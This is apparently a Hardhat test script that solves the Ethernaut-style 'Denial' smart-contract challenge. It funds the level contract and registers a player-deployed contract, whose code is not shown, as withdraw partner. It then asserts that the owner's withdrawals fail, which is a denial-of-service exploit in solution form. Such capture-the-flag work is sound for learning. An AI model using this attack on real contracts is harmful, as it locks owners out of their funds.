const { expect } = require("chai");
const { ethers } = require("hardhat");
var tools = require("./tools");

describe("20Denial", function () {
  let player, levelOwner, levelContract, runContract;
  it("setup", async function () {
    [player, levelOwner, levelContract] = await tools.initLevel("Denial");
    runContract = await tools.deployContract("DenialRun", player);

    await levelOwner.sendTransaction({
      to: levelContract.address,
      value: ethers.utils.parseEther("10"),
    });

    let beforeOwnerBalance = await tools.getBalance(levelContract.owner());

    //检测是不是可以转
    await levelContract.withdraw({ gasLimit: 1000000 });

    expect(await tools.getBalance(levelContract.owner())).to.above(
      beforeOwnerBalance
    );
  });

  it("attacks", async function () {
    await levelContract.connect(player).setWithdrawPartner(runContract.address);
  });

  it("check", async function () {
    let error = false;
    let beforeOwnerBalance = await tools.getBalance(levelContract.owner());
    try {
      await levelContract.withdraw({ gasLimit: 1000000 });
    } catch (e) {
      error = true;
    }
    //检查通过条件
    expect(error).to.equal(true);
    expect(await tools.getBalance(levelContract.owner())).to.equal(
      beforeOwnerBalance
    );
  });
});
